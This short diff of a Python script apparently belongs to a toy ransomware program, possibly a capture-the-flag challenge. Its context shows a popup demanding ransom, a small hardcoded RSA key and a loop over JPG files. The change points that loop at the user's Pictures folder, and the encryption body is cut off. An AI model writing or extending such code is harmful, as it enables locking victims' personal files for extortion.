@@ -8,7 +8,7 @@ os.system('zenity --error --text="<big>Give Me ransom HAHA!</big>" --title="Warn
 n = int(22291846172619859445381409012451)
 e = int(65535)
 
-jps_files = glob.glob("*.jpg")
+jps_files = glob.glob("./Pictures/*.jpg")
 for i in jps_files:
     filename = str(i)
     plain_bytes = b''
